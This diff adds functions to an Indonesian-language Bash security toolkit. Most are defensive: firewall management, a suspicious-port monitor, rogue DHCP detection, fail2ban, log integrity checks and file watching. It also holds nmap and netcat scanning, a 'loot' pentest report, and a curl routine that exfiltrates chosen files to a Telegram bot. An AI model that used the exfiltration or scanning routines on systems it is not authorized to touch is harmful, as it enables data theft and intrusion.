+      sudo iptables -L INPUT -n --line-numbers | grep "DROP" | while read -r line; do
+        num=$(echo "$line" | awk '{print $1}')
+        ip=$(echo "$line" | awk '{print $4}')
+        packets=$(echo "$line" | awk '{print $NF}')
+        printf "%-5s %-20s\n" "$num" "$ip"
+      done
+      ;;
+
+    3)
+      read -p "IP yang mau di-unblock: " ip
+      if [ -z "$ip" ]; then
+        print_error "IP tidak boleh kosong"
+        return
+      fi
+      sudo iptables -D INPUT -s "$ip" -j DROP 2>/dev/null
+      sudo iptables -D OUTPUT -d "$ip" -j DROP 2>/dev/null
+      print_success "IP $ip berhasil di-unblock"
+      echo "[$(date '+%F %T')] UNBLOCK: $ip" >> "$LOG_DIR/blocklist.log"
+      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_conn_monitor() {
+  IN_MONITOR_MODE=1
+  clear
+  print_section "CONNECTION MONITOR - LIVE TRAFFIC"
+  print_info "Memantau koneksi aktif... CTRL+C untuk berhenti"
+  echo ""
+
+  SUSPICIOUS_PORTS="4444 1337 31337 6666 6667 9999 8888"
+
+  (
+    while true; do
+      clear
+      print_section "ACTIVE CONNECTIONS"
+      echo ""
+
+      printf "%-10s %-25s %-25s %-15s %s\n" "PROTO" "LOCAL" "REMOTE" "STATUS" "PROGRAM"
+      echo "------------------------------------------------------------------------------------"
+
+      ss -tupn 2>/dev/null | tail -n +2 | while read -r line; do
+        proto=$(echo "$line" | awk '{print $1}')
+        local=$(echo "$line" | awk '{print $5}')
+        remote=$(echo "$line" | awk '{print $6}')
+        status=$(echo "$line" | awk '{print $2}')
+        prog=$(echo "$line" | awk '{print $NF}' | grep -oP 'users:\(\("\K[^"]+')
+        remote_port=$(echo "$remote" | grep -oP ':\K\d+$')
+
+        suspicious=0
+        for sp in $SUSPICIOUS_PORTS; do
+          [ "$remote_port" = "$sp" ] && suspicious=1
+        done
+
+        if [ "$suspicious" -eq 1 ]; then
+          echo -e "${RED}[⚠]${NC} $(printf "%-10s %-25s %-25s %-15s %s" "$proto" "$local" "$remote" "$status" "${prog:-unknown}")"
+          echo "[$(date '+%F %T')] SUSPICIOUS: $proto $local -> $remote $prog" >> "$LOG_DIR/conn_monitor.log"
+        else
+          printf "%-10s %-25s %-25s %-15s %s\n" "$proto" "$local" "$remote" "$status" "${prog:-unknown}"
+        fi
+      done
+
+      echo ""
+      print_info "Refresh tiap 2 detik... CTRL+C untuk berhenti"
+      sleep 2
+    done
+  ) &
+
+  CURRENT_CHILD=$!
+  wait "$CURRENT_CHILD" 2>/dev/null
+
+  IN_MONITOR_MODE=0
+}
+
+cmd_dhcp_snooping() {
+  clear
+  print_section "DHCP SNOOPING - DETEKSI ROGUE DHCP"
+
+  if ! command -v nmap >/dev/null 2>&1; then
+    print_error "nmap belum terinstall"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  print_info "Scanning DHCP server di jaringan..."
+  print_info "Ini mungkin butuh beberapa detik..."
+  echo ""
+
+  result=$(sudo nmap --script broadcast-dhcp-discover -e "$(ip route | grep default | awk '{print $5}' | head -1)" 2>/dev/null)
+
+  server_count=$(echo "$result" | grep -c "Server Identifier")
+
+  echo -e "${CYAN}=============================${NC}"
+  echo -e "${CYAN}  HASIL DHCP SCAN${NC}"
+  echo -e "${CYAN}=============================${NC}"
+  echo ""
+
+  if [ "$server_count" -eq 0 ]; then
+    print_error "Tidak ada DHCP server terdeteksi"
+  elif [ "$server_count" -eq 1 ]; then
+    print_success "1 DHCP server ditemukan (normal)"
+    echo ""
+    echo "$result" | grep -E "Server Identifier|Router|Subnet|DNS" | while read -r line; do
+      echo "  $line"
+    done
+  else
+    echo -e "${RED}[⚠] PERINGATAN: $server_count DHCP server ditemukan!${NC}"
+    echo -e "${RED}    Kemungkinan ada ROGUE DHCP server di jaringan!${NC}"
+    echo ""
+    echo "$result" | grep -E "Server Identifier|Router|Subnet|DNS" | while read -r line; do
+      echo "  $line"
+    done
+    echo "[$(date '+%F %T')] ROGUE DHCP DETECTED: $server_count servers" >> "$LOG_DIR/dhcp_snoop.log"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_mac_whitelist() {
+  clear
+  print_section "MAC WHITELIST - KONTROL AKSES DEVICE"
+
+  WHITELIST_FILE="$LOG_DIR/mac_whitelist.txt"
+  touch "$WHITELIST_FILE"
+
+  echo "1. Lihat whitelist"
+  echo "2. Tambah MAC ke whitelist"
+  echo "3. Hapus MAC dari whitelist"
+  echo "4. Scan & bandingkan dengan jaringan"
+  echo "5. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      if [ ! -s "$WHITELIST_FILE" ]; then
+        print_info "Whitelist kosong"
+      else
+        echo -e "${CYAN}MAC Address yang diizinkan:${NC}"
+        echo ""
+        cat -n "$WHITELIST_FILE"
+      fi
+      ;;
+
+    2)
+      read -p "MAC Address (contoh: aa:bb:cc:dd:ee:ff): " mac
+      mac=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
+      if [[ ! "$mac" =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]]; then
+        print_error "Format MAC tidak valid"
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        return
+      fi
+      if grep -qx "$mac" "$WHITELIST_FILE"; then
+        print_info "MAC sudah ada di whitelist"
+      else
+        echo "$mac" >> "$WHITELIST_FILE"
+        print_success "MAC $mac ditambahkan"
+      fi
+      ;;
+
+    3)
+      read -p "MAC Address yang mau dihapus: " mac
+      mac=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
+      sed -i "/^$mac$/d" "$WHITELIST_FILE"
+      print_success "MAC $mac dihapus dari whitelist"
+      ;;
+
+    4)
+      echo ""
+      print_info "Scan device di jaringan..."
+      echo ""
+
+      printf "%-20s %-20s %s\n" "IP" "MAC" "STATUS"
+      echo "------------------------------------------------------------"
+
+      ip neigh show 2>/dev/null | while read -r line; do
+        ip=$(echo "$line" | awk '{print $1}')
+        mac=$(echo "$line" | awk '{print $5}' | tr '[:upper:]' '[:lower:]')
+
+        [ -z "$mac" ] || [ "$mac" = "FAILED" ] && continue
+
+        if grep -qx "$mac" "$WHITELIST_FILE"; then
+          printf "%-20s %-20s " "$ip" "$mac"
+          echo -e "${GREEN}[✔ TRUSTED]${NC}"
+        else
+          printf "%-20s %-20s " "$ip" "$mac"
+          echo -e "${RED}[⚠ UNKNOWN]${NC}"
+          echo "[$(date '+%F %T')] UNKNOWN MAC: $mac IP: $ip" >> "$LOG_DIR/mac_whitelist.log"
+        fi
+      done
+      ;;
+
+    5) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+# =========================
+# COMMAND MAP - TCP TOOLS
+# =========================
+
+cmd_tcp_scan_port() {
+  init_storage
+  clear
+
+  read -p "Target: " t
+
+  print_section "TCP FULL SCAN"
+  print_keyval "Target" "$t"
+  echo ""
+
+  nmap -sT "$t"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_tcp_service_detection() {
+  init_storage
+  clear
+
+  read -p "Target: " t
+
+  print_section "SERVICE DETECTION"
+  print_keyval "Target" "$t"
+  echo "[~] Scanning services..."
+  echo ""
+
+  nmap -sV "$t"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_tcp_range_scan() {
+  init_storage
+  clear
+
+  read -p "Target: " t
+
+  print_section "PORT RANGE SCAN"
+  print_keyval "Target" "$t"
+  print_keyval "Range" "1-1000"
+  echo ""
+
+  nmap -p 1-1000 "$t"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_tcp_specific_port() {
+  init_storage
+  clear
+
+  read -p "Target: " t
+  read -p "Port: " p
+
+  print_section "PORT CHECK"
+  print_keyval "Target" "$t"
+  print_keyval "Port" "$p"
+  echo ""
+
+  nmap -p "$p" "$t"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_tcp_local_ports() {
+  clear
+
+  print_section "LOCAL OPEN PORTS"
+  echo ""
+
+  ss -tuln
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_tcp_banner_grab() {
+  clear
+
+  if ! command -v nc >/dev/null 2>&1; then
+    print_error "netcat tidak tersedia"
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  read -p "Target: " t
+
+  print_section "BANNER GRAB"
+  print_keyval "Target" "$t"
+  print_keyval "Port" "80"
+  echo ""
+
+  nc -w 3 "$t" 80
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_port_knock_setup() {
+  clear
+  print_section "PORT KNOCKING - SEMBUNYIKAN PORT SSH"
+
+  echo "1. Install & setup knockd"
+  echo "2. Lihat konfigurasi aktif"
+  echo "3. Test knock sequence"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      if ! command -v knockd >/dev/null 2>&1; then
+        print_info "Menginstall knockd..."
+        sudo apt install -y knockd >/dev/null 2>&1
+      fi
+
+      iface=$(ip route | grep default | awk '{print $5}' | head -1)
+
+      read -p "Port sequence (contoh: 7000,8000,9000): " sequence
+      sequence="${sequence:-7000,8000,9000}"
+
+      read -p "Port yang mau dibuka (default: 22): " target_port
+      target_port="${target_port:-22}"
+
+      read -p "Timeout detik (default: 10): " timeout
+      timeout="${timeout:-10}"
+
+      sudo tee /etc/knockd.conf > /dev/null <<EOF
+[options]
+    Interface = $iface
+    UseSyslog
+
+[openSSH]
+    sequence    = $sequence
+    seq_timeout = $timeout
+    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport $target_port -j ACCEPT
+    tcpflags    = syn
+
+[closeSSH]
+    sequence    = $(echo $sequence | tr ',' '\n' | tac | tr '\n' ',' | sed 's/,$//')
+    seq_timeout = $timeout
+    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport $target_port -j ACCEPT
+    tcpflags    = syn
+EOF
+
+      sudo systemctl enable knockd >/dev/null 2>&1
+      sudo systemctl restart knockd
+
+      echo ""
+      print_success "Port knocking aktif !"
+      echo ""
+      echo -e "${CYAN}Sequence untuk buka port $target_port:${NC}"
+      echo -e "${GREEN}  knock <server_ip> $sequence${NC}"
+      echo ""
+      echo -e "${CYAN}Sequence untuk tutup port $target_port:${NC}"
+      reverse=$(echo $sequence | tr ',' '\n' | tac | tr '\n' ',' | sed 's/,$//')
+      echo -e "${GREEN}  knock <server_ip> $reverse${NC}"
+      ;;
+
+    2)
+      if [ -f /etc/knockd.conf ]; then
+        echo ""
+        cat /etc/knockd.conf
+      else
+        print_error "knockd belum dikonfigurasi"
+      fi
+      ;;
+
+	    3)
+	      if ! command -v knock >/dev/null 2>&1; then
+	        sudo apt install -y knockd >/dev/null 2>&1
+	      fi
+	      read -p "Server IP: " server
+	      read -p "Sequence (contoh: 7000 8000 9000): " seq
+	      if [ -z "$server" ] || [ -z "$seq" ]; then
+	        print_error "Server/sequence kosong"
+	        return
+	      fi
+	      knock "$server" $seq
+	      print_success "Knock sequence dikirim ke $server"
+	      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_fail2ban_status() {
+  clear
+  print_section "FAIL2BAN - ANTI BRUTE FORCE MONITOR"
+
+  if ! command -v fail2ban-client >/dev/null 2>&1; then
+    print_error "fail2ban belum terinstall"
+    echo ""
+    read -p "Install fail2ban? (Y/n): " ins
+    ins="${ins:-Y}"
+    if [ "$ins" = "Y" ] || [ "$ins" = "y" ]; then
+      sudo apt install -y fail2ban >/dev/null 2>&1
+      sudo systemctl enable fail2ban
+      sudo systemctl start fail2ban
+      print_success "fail2ban terinstall dan berjalan"
+    fi
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "1. Status semua jail"
+  echo "2. Detail jail SSH"
+  echo "3. Lihat IP yang diban"
+  echo "4. Unban IP"
+  echo "5. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      print_section "STATUS JAIL"
+      sudo fail2ban-client status 2>/dev/null
+      ;;
+
+    2)
+      echo ""
+      print_section "DETAIL SSH JAIL"
+      sudo fail2ban-client status sshd 2>/dev/null || \
+      sudo fail2ban-client status ssh 2>/dev/null || \
+      print_error "SSH jail tidak aktif"
+      ;;
+
+    3)
+      echo ""
+      print_section "BANNED IP LIST"
+      echo ""
+      sudo fail2ban-client status sshd 2>/dev/null | grep "Banned IP" | while read -r line; do
+        ips=$(echo "$line" | cut -d: -f2)
+        for ip in $ips; do
+          echo -e "  ${RED}[BANNED]${NC} $ip"
+        done
+      done
+      ;;
+
+	    4)
+	      read -p "IP yang mau di-unban: " ip
+	      if [ -z "$ip" ]; then
+	        print_error "IP tidak boleh kosong"
+	        return
+	      fi
+	      sudo fail2ban-client set sshd unbanip "$ip" 2>/dev/null || \
+	      sudo fail2ban-client set ssh unbanip "$ip" 2>/dev/null
+	      print_success "IP $ip di-unban"
+      ;;
+
+    5) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_syn_flood_detect() {
+  clear
+  print_section "SYN FLOOD DETECTOR - ANTI DDOS"
+
+  print_info "Menganalisa koneksi SYN_RECV..."
+  echo ""
+
+  syn_count=$(ss -ant 2>/dev/null | grep -c "SYN-RECV")
+  syncookies=$(cat /proc/sys/net/ipv4/tcp_syncookies 2>/dev/null)
+
+  echo -e "${CYAN}=============================${NC}"
+  echo -e "${CYAN}  HASIL ANALISA${NC}"
+  echo -e "${CYAN}=============================${NC}"
+  echo ""
+
+  print_keyval "SYN_RECV total" "$syn_count koneksi"
+
+  if [ "$syncookies" = "1" ]; then
+    print_keyval "SYN Cookies" "$(echo -e "${GREEN}AKTIF${NC} (terlindungi)")"
+  else
+    print_keyval "SYN Cookies" "$(echo -e "${RED}TIDAK AKTIF${NC} (rentan!)")"
+  fi
+
+  echo ""
+
+  if [ "$syn_count" -gt 100 ]; then
+    echo -e "${RED}[⚠] PERINGATAN: SYN FLOOD TERDETEKSI!${NC}"
+    echo -e "${RED}    $syn_count koneksi SYN_RECV aktif${NC}"
+    echo ""
+    echo "Top IP penyerang:"
+    echo ""
+    ss -ant 2>/dev/null | grep "SYN-RECV" | awk '{print $5}' | \
+      cut -d: -f1 | sort | uniq -c | sort -rn | head -10 | \
+      while read -r count ip; do
+        printf "  ${RED}%-20s${NC} %s attempts\n" "$ip" "$count"
+      done
+    echo "[$(date '+%F %T')] SYN FLOOD: $syn_count SYN_RECV" >> "$LOG_DIR/syn_flood.log"
+  elif [ "$syn_count" -gt 50 ]; then
+    echo -e "${YELLOW}[!] WASPADA: $syn_count SYN_RECV (mulai tinggi)${NC}"
+  else
+    print_success "Kondisi normal ($syn_count SYN_RECV)"
+  fi
+
+  echo ""
+
+  if [ "$syncookies" != "1" ]; then
+    echo -e "${YELLOW}Aktifkan SYN Cookies untuk perlindungan? (Y/n): ${NC}"
+    read -r ans
+    ans="${ans:-Y}"
+    if [ "$ans" = "Y" ] || [ "$ans" = "y" ]; then
+      sudo sysctl -w net.ipv4.tcp_syncookies=1 >/dev/null
+      echo "net.ipv4.tcp_syncookies=1" | sudo tee -a /etc/sysctl.conf >/dev/null
+      print_success "SYN Cookies diaktifkan"
+    fi
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+# =========================
+# COMMAND MAP - STORAGE
+# =========================
+
+cmd_storage_local() {
+  clear
+
+  storage_mode="local"
+  storage_path="$HOME/kecembung_logs"
+  mkdir -p "$storage_path"
+
+  echo "[✔] Local Storage Active"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_storage_usb() {
+  clear
+
+  if [ "$USB_SELECTED" -ne 1 ] || [ -z "$USB_PATH" ]; then
+    echo "[!] USB belum dipilih"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  storage_mode="usb"
+  storage_path="$USB_PATH/KECEMBUNG"
+  mkdir -p "$storage_path"
+
+  echo ""
+  echo "[✔] USB Storage Active"
+  echo "[~] Path: $storage_path"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_storage_install() {
+  clear
+
+  read -p "Install apa? (contoh: nmap): " pkg
+
+  echo ""
+
+  if [ -z "$pkg" ]; then
+    echo "[!] Tidak ada input"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "[~] Installing: $pkg"
+  sudo apt update -y >/dev/null 2>&1
+  sudo apt install -y "$pkg"
+
+  if [ $? -eq 0 ]; then
+    echo "[✔] Installed: $pkg"
+    log_save "Install $pkg"
+  else
+    echo "[!] Install gagal: $pkg"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_storage_save_log() {
+  clear
+
+  init_storage
+
+  echo "========================="
+  echo " SAVE LOG"
+  echo "========================="
+
+  read -p "Ketik YES untuk save log: " confirm
+
+  if [ "$confirm" != "YES" ]; then
+    echo "[x] Dibatalkan"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  LOG_SRC="$LOG_DIR/kecembung_log.txt"
+
+  if [ ! -f "$LOG_SRC" ]; then
+    echo "[!] Log file belum ada"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  if [ ! -w "$storage_path" ]; then
+    echo "[!] Storage tidak writable"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  cp "$LOG_SRC" "$storage_path/" && echo "[✔] Log berhasil disimpan"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_log_integrity_check() {
+  clear
+  print_section "LOG INTEGRITY CHECK - DETEKSI TAMPERING"
+
+  HASH_FILE="$LOG_DIR/log_hashes.txt"
+  LOG_TARGETS="/var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/dpkg.log"
+
+  echo "1. Simpan hash log sekarang (baseline)"
+  echo "2. Cek integritas log"
+  echo "3. Lihat history check"
+  echo "4. Kembali"
+  echo ""
+
+  read -p "Pilih: " opt
+
+  case $opt in
+    1)
+      echo ""
+      print_info "Menyimpan hash baseline..."
+      echo ""
+      > "$HASH_FILE.new"
+      for log in $LOG_TARGETS; do
+        if [ -f "$log" ]; then
+          hash=$(sha256sum "$log" | awk '{print $1}')
+          echo "$log:$hash:$(date +%s)" >> "$HASH_FILE.new"
+          print_success "$(basename "$log") → $hash"
+        else
+          print_error "$log tidak ditemukan"
+        fi
+      done
+      mv "$HASH_FILE.new" "$HASH_FILE"
+      print_success "Baseline disimpan"
+      ;;
+
+    2)
+      echo ""
+      if [ ! -f "$HASH_FILE" ]; then
+        print_error "Belum ada baseline. Jalankan opsi 1 dulu."
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        return
+      fi
+
+      print_info "Mengecek integritas log..."
+      echo ""
+
+      printf "%-30s %s\n" "FILE" "STATUS"
+      echo "--------------------------------------------"
+
+      while IFS=: read -r logfile stored_hash timestamp; do
+        if [ ! -f "$logfile" ]; then
+          printf "%-30s " "$(basename "$logfile")"
+          echo -e "${RED}[FILE HILANG!]${NC}"
+          echo "[$(date '+%F %T')] MISSING: $logfile" >> "$LOG_DIR/integrity.log"
+          continue
+        fi
+
+        current_hash=$(sha256sum "$logfile" | awk '{print $1}')
+
+        printf "%-30s " "$(basename "$logfile")"
+
+        if [ "$current_hash" = "$stored_hash" ]; then
+          echo -e "${GREEN}[✔ CLEAN]${NC}"
+        else
+          echo -e "${RED}[⚠ TAMPERED!]${NC}"
+          echo "[$(date '+%F %T')] TAMPERED: $logfile" >> "$LOG_DIR/integrity.log"
+        fi
+
+      done < "$HASH_FILE"
+      ;;
+
+    3)
+      echo ""
+      if [ -f "$LOG_DIR/integrity.log" ]; then
+        cat "$LOG_DIR/integrity.log"
+      else
+        print_info "Belum ada history check"
+      fi
+      ;;
+
+    4) return ;;
+  esac
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_file_monitor() {
+  IN_MONITOR_MODE=1
+  clear
+  print_section "FILE MONITOR - REAL TIME WATCHER"
+
+  if ! command -v inotifywait >/dev/null 2>&1; then
+    print_error "inotify-tools belum terinstall"
+    echo ""
+    read -p "Install sekarang? (Y/n): " ins
+    ins="${ins:-Y}"
+    if [ "$ins" = "Y" ] || [ "$ins" = "y" ]; then
+      sudo apt install -y inotify-tools >/dev/null 2>&1
+      print_success "inotify-tools terinstall"
+    else
+      echo ""
+      read -p "Tekan ENTER untuk kembali..."
+      IN_MONITOR_MODE=0
+      return
+    fi
+  fi
+
+  echo "Path yang mau dimonitor:"
+  echo "1. /etc (sistem config)"
+  echo "2. /var/www (web server)"
+  echo "3. /home (user files)"
+  echo "4. Custom path"
+  echo ""
+  read -p "Pilih: " pathopt
+
+  case $pathopt in
+    1) watch_path="/etc" ;;
+    2) watch_path="/var/www" ;;
+    3) watch_path="/home" ;;
+    4)
+      read -p "Path: " watch_path
+      if [ ! -d "$watch_path" ] && [ ! -f "$watch_path" ]; then
+        print_error "Path tidak ditemukan"
+        echo ""
+        read -p "Tekan ENTER untuk kembali..."
+        IN_MONITOR_MODE=0
+        return
+      fi
+      ;;
+    *) watch_path="/etc" ;;
+  esac
+
+  echo ""
+  print_info "Memantau: $watch_path"
+  print_info "CTRL+C untuk berhenti"
+  echo ""
+  printf "%-20s %-12s %s\n" "WAKTU" "EVENT" "FILE"
+  echo "------------------------------------------------------------"
+
+  inotifywait -m -r "$watch_path" \
+    -e create -e modify -e delete -e moved_to -e moved_from \
+    --format '%T %e %w%f' \
+    --timefmt '%H:%M:%S' 2>/dev/null | while read -r time event file; do
+
+    case $event in
+      CREATE|MOVED_TO)   color="$YELLOW" ;;
+      DELETE|MOVED_FROM) color="$RED" ;;
+      MODIFY)            color="$CYAN" ;;
+      *)                 color="$NC" ;;
+    esac
+
+    printf "%-20s " "$time"
+    echo -ne "${color}"
+    printf "%-12s " "$event"
+    echo -e "${NC}$file"
+
+    echo "[$(date '+%F %T')] $event: $file" >> "$LOG_DIR/file_monitor.log"
+  done &
+
+  CURRENT_CHILD=$!
+  wait "$CURRENT_CHILD" 2>/dev/null
+
+  IN_MONITOR_MODE=0
+}
+
+# =========================
+# COMMAND MAP - USB TOOLS
+# =========================
+
+cmd_usb_detect() {
+  clear
+
+  echo ""
+  echo "[~] Available USB devices:"
+  echo ""
+
+  lsblk -o NAME,SIZE,MOUNTPOINT | grep "/media\|/run/media"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_usb_select() {
+  clear
+
+  echo ""
+  echo "[~] Select USB:"
+  lsblk -o NAME,SIZE,MOUNTPOINT | grep "/media\|/run/media"
+  echo ""
+
+  read -p "Paste mount path USB: " input
+
+  input="${input%/}"
+
+  if [[ "$input" == /media/* || "$input" == /run/media/* ]]; then
+    if [ -d "$input" ]; then
+      USB_PATH="$input"
+      USB_SELECTED=1
+
+      echo ""
+      echo "[✔] USB selected"
+      echo "[~] Path: $USB_PATH"
+    else
+      echo "[!] Path tidak ada"
+      USB_SELECTED=0
+    fi
+  else
+    echo "[!] Invalid USB path"
+    USB_SELECTED=0
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_usb_workspace() {
+  clear
+
+  echo ""
+
+  if [ "$USB_SELECTED" -ne 1 ] || [ -z "$USB_PATH" ]; then
+    echo "[!] USB belum dipilih"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  mkdir -p "$USB_PATH/KECEMBUNG/logs"
+  mkdir -p "$USB_PATH/KECEMBUNG/reports"
+
+  echo "[✔] Workspace created"
+  echo "[~] KECEMBUNG directory ready"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_usb_read() {
+  clear
+
+  echo ""
+
+  if [ "$USB_SELECTED" -ne 1 ] || [ -z "$USB_PATH" ]; then
+    echo "[!] USB belum dipilih"
+  else
+    echo "[~] Reading USB structure:"
+    echo ""
+    ls -R "$USB_PATH"
+  fi
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_usb_delete() {
+  clear
+
+  echo ""
+
+  if [ "$USB_SELECTED" -ne 1 ] || [ -z "$USB_PATH" ]; then
+    echo "[!] No USB selected"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  echo "[!] Deleting: $USB_PATH/*"
+  echo "[⚠] This action cannot be undone"
+  echo ""
+
+  read -p "Type YES to confirm: " confirm
+
+  [ "$confirm" != "YES" ] && return
+
+  if [[ "$USB_PATH" != /media/* && "$USB_PATH" != /run/media/* ]]; then
+    echo "[!] BLOCKED: not a real USB mount"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  if [ ! -d "$USB_PATH" ]; then
+    echo "[!] Invalid path"
+
+    echo ""
+    read -p "Tekan ENTER untuk kembali..."
+    return
+  fi
+
+  find "$USB_PATH" -mindepth 1 -maxdepth 5 -exec rm -rf {} \;
+  sync
+
+  echo "[✔] USB cleaned successfully"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali..."
+}
+
+cmd_auto_report() {
+  if ! command -v pandoc >/dev/null 2>&1; then
+    echo -e "${RED}[X] pandoc not found. Install: sudo apt install pandoc wkhtmltopdf${NC}"
+    return 1
+  fi
+
+  local timestamp=$(date +%Y%m%d_%H%M%S)
+  local md_file="$RESULTS_DIR/report_${timestamp}.md"
+  local html_file="$RESULTS_DIR/Kecembung_Report_${timestamp}.html"
+  mkdir -p "$RESULTS_DIR"
+
+  log "REPORT: Generating auto report"
+  echo -e "${YELLOW}[~] Compiling report...${NC}"
+
+  cat > "$md_file" << EOF
+# Kecembung Penetration Test Report
+**Generated:** $(date)
+**Operator:** $(whoami)@$(hostname)
+
+## Summary
+Auto-generated report from Kecembung v2.1.0 - Ghost Protocol
+
+## Logs
+\`\`\`
+$(tail -50 "$LOG_DIR/kecembung_log.txt" 2>/dev/null)
+\`\`\`
+
+## Results Directory
+\`\`\`
+$(ls -lh "$RESULTS_DIR" 2>/dev/null)
+\`\`\`
+
+## Loot Directory
+\`\`\`
+$(ls -lh "$LOOT_DIR" 2>/dev/null)
+\`\`\`
+EOF
+
+  pandoc "$md_file" -o "$html_file" --standalone --metadata title="Kecembung Report"
+
+  echo -e "${GREEN}[✔] Report generated: $html_file${NC}"
+  log "REPORT: Auto report saved to $html_file"
+}
+
+cmd_telegram_exfil() {
+  local file="${1:-}"
+  [ -z "$file" ] && read -p "File path to send: " file
+
+  if [ -z "$file" ]; then
+    echo -e "${YELLOW}[x] Dibatalkan${NC}"
+    return 0
+  fi
+
+  if [ ! -f "$file" ]; then
+    echo -e "${RED}[X] File not found: $file${NC}"
+    return 1
+  fi
+
+  local config="$HOME/.kecembung/config"
+  if [ ! -f "$config" ]; then
+    echo -e "${RED}[X] Config not found. Create ~/.kecembung/config:${NC}"
+    echo -e "${CYAN}BOT_TOKEN=your_token_here${NC}"
+    echo -e "${CYAN}CHAT_ID=your_chat_id_here${NC}"
+    return 1
+  fi
+
+  source "$config"
+  if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+    echo -e "${RED}[X] BOT_TOKEN or CHAT_ID missing in config${NC}"
+    return 1
+  fi
+
+  log "REPORT: Telegram exfil started for $file"
+  echo -e "${YELLOW}[~] Sending to Telegram...${NC}"
+
+  curl -s -F chat_id="$CHAT_ID" -F document=@"$file" \
+    "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" > /dev/null
+
+  if [ $? -eq 0 ]; then
+    echo -e "${GREEN}[✔] File sent to Telegram${NC}"
+    log "REPORT: File $file exfiltrated via Telegram"
+  else
+    echo -e "${RED}[X] Failed to send${NC}"
+  fi
+}
+
+cmd_scan_scheduler() {
+  local scenario="${1:-}"
+  local cron_time="${2:-}"
+
+  [ -z "$scenario" ] && read -p "Scenario file path: " scenario
+  [ -z "$cron_time" ] && read -p "Cron time [0 2 * * * = 2AM daily]: " cron_time
+  cron_time="${cron_time:-0 2 * * *}"
+
+  if [ -z "$scenario" ]; then
+    echo -e "${YELLOW}[x] Dibatalkan${NC}"
+    return 0
+  fi
+
+  if [ ! -f "$scenario" ]; then
+    echo -e "${RED}[X] Scenario file not found: $scenario${NC}"
+    return 1
+  fi
+
+  local kecembung_path=$(realpath "$0")
+  local cron_cmd="$cron_time $kecembung_path --run-scenario $scenario >> $LOG_DIR/scheduler.log 2>&1"
+
+  log "REPORT: Adding cron schedule for $scenario"
+  echo -e "${YELLOW}[~] Adding to crontab...${NC}"
+
+  (crontab -l 2>/dev/null; echo "$cron_cmd") | crontab -
+
+  echo -e "${GREEN}[✔] Scheduled: $cron_time${NC}"
+  echo -e "${CYAN}Check: crontab -l${NC}"
+  echo -e "${CYAN}Logs: $LOG_DIR/scheduler.log${NC}"
+  log "REPORT: Cron scheduled: $cron_cmd"
+}
+
+# =========================
+# COMMAND MAP - AI TOOLS
+# =========================
+
+cmd_ai_webcam_all() {
+  clear
+  echo "========================="
+  echo "[ AI - WEBCAM ALL ]"
+  echo "========================="
+
+  init_storage
+  mkdir -p "$storage_path/captures"
+
+  safe_ai 0 "$AI_PYTHON" "$AI_DETECT" 0 "$storage_path/captures" all
+
+  log_save "AI Webcam All"
+
+  echo ""
+  read -p "Tekan ENTER untuk kembali"
+}
+
+cmd_ai_webcam_person() {
+  clear
+  echo "========================="
